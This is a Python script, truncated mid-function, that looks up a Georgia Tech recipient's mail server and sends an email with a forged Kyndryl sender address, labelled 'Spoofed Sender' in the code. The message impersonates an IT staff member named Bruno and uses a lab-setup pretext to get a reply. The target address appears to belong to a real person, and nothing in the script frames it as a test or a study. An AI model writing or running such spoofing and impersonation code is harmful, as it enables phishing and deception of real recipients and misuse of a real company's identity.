import smtplib
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_bruno_email():
    # --- 1. Configuration Parameters ---
    target_user = "lhuang434@gatech.edu"  # Recipient
    fake_sender = "bruno.external@kyndryl.com"  # Spoofed Sender
    subject = "Georgia Tech Lab Setup - Draft Reference"
    
    body = """Hi Nathan,

This is Bruno from the IT Demand team at Kyndryl. I’m sharing a short draft file related to the Georgia Tech lab setup for your reference.

Could you please confirm whether you received this email when you have a moment?

Thank you for your help.

Best regards,

Bruno"""

    print(f"Attempting to send email to {target_user}...")

    try:
        # --- 2. Retrieve MX Records for the Target Domain ---
        domain = target_user.split('@')[-1]
        answers = dns.resolver.resolve(domain, 'MX')
        # Sort by preference and pick the top priority server
        mx_server = str(sorted(answers, key=lambda r: r.preference)[0].exchange)
        print(f"Target server found: {mx_server}")

        # --- 3. Construct Email Message ---
        msg = MIMEMultipart()
        msg['From'] = f"Bruno <{fake_sender}>"
        msg['To'] = target_user
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # --- 4. Establish Connection and Deliver (Port 25) ---
        with smtplib.SMTP(mx_server, 25, timeout=20) as server:
            # Enable this to see